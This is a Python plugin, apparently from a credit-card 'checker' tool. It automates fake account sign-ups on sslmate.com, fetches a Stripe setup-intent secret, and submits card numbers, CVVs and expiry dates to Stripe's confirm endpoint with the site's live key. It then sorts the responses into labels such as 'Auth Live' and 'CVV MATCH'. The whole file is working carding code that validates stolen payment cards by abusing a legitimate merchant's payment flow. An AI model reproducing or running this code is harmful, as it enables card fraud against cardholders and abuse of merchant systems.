from mills.plugins._helpers.tools import find_between
from mills.classes.rand_user import RandUser



def au_one(r):
    a = r.get('https://sslmate.com/pricing/certificates')
    if not a: return 
    b = r.get('https://sslmate.com/signup?for=basic')
    if not b: return
    crsf = dict(r.cookies)['__Host-sslmate-csrf_token']
    return crsf



def au_two(r, crsf):
    user_info = RandUser().rand_user()
    payload_c = {
'csrf_token': crsf,
'username': user_info['username'],
'email': user_info['email'],
'password': user_info['password'],
'submit_btn': 'Create My Account',
}
    c = r.post('https://sslmate.com/signup?for=basic', data = payload_c)
    if not c: return
    payload_d = {'csrf_token': crsf}
    d = r.post('https://sslmate.com/console/create_stripe_setup_intent', data = payload_d)
    if not d: return
    sec = d.json()['client_secret'] if 'client_secret' in d.json() else None
    if not sec: return
    req_sec = sec.split('_secret')[0]

    return sec,req_sec





def au_three(r, sec, req_sec, cc, mes,ano, cvv):
    payload_e = {
'payment_method_data[type]': 'card',
'payment_method_data[card][number]': cc,
'payment_method_data[card][cvc]': cvv,
'payment_method_data[card][exp_month]': mes,
'payment_method_data[card][exp_year]': ano,
'payment_method_data[pasted_fields]': 'number',
'payment_method_data[payment_user_agent]': 'stripe.js/394a74bde; stripe-js-v3/394a74bde',
'payment_method_data[time_on_page]': '52031',
'expected_payment_method_type': 'card',
'use_stripe_sdk': 'true',
'key': 'pk_live_AZE9GUp1xSOBnn6iDBqVUiqo',
'client_secret': sec,
}

    e = r.post(f'https://api.stripe.com/v1/setup_intents/{req_sec}/confirm', data = payload_e)
    return e.json()



def get_response_au(text: str):
    if "card was declined" in text or 'card_declined' in text or 'The transaction has been declined' in text or 'Processor Declined' in text:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'DECLINED'
    elif 'Your card number is incorrect' in text or 'Call to a member function attach() on null' in text:
        r_text, r_logo, r_respo = "INCORRECT NUMBER", "❌", 'DECLINED'
    elif 'incorrect_zip' in text or 'Your card zip code is incorrect.' in text or 'The zip code you supplied failed validation' in text or 'card zip code is incorrect' in text:
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'CVV MATCH'
    elif "card has insufficient funds" in text or 'insufficient_funds' in text or 'Insufficient Funds' in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'CVV MATCH'
    elif 'incorrect_cvc' in text or "card's security code is incorrect" in text or "card&#039;s security code is incorrect" in text or "security code is invalid" in text or 'CVC was incorrect' in text or "incorrect CVC" in text or 'cvc was incorrect' in text or 'Card Issuer Declined CVV' in text or 'security code is incorrect' in text:
        r_text, r_logo, r_respo = "CCN MATCH", "✅", 'CCN Match'
    elif "card does not support this type of purchase" in text or 'transaction_not_allowed' in text or 'Transaction Not Allowed' in text:
        r_text, r_logo, r_respo = "PURCHASE NOT SUPPORTED", "❌", 'DECLINED'
    elif "Customer authentication is required" in text or "unable to authenticate" in text or "three_d_secure_redirect" in text or "hooks.stripe.com/redirect/" in text or 'requires an authorization' in text or 'card_error_authentication_required' in text:
        r_text, r_logo, r_respo = "3D SECURITY", "❌", 'DECLINED'
    elif "card has expired" in text or 'Expired Card' in text:
        r_text, r_logo, r_respo = "EXPIRED CARD", "❌", 'DECLINED'
    elif 'Donation Confirmation' in text or "This page doesn't seem to exist" in text or 'seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
        r_text, r_logo, r_respo = "Auth Live", "✅", 'CVV MATCH'
    else:
        r_text, r_logo, r_respo = 'UNKOWN RESPONSE', "❌", 'DECLINED'
    r_text1 = text.strip() if text else r_text
    return r_text1, r_logo, r_respo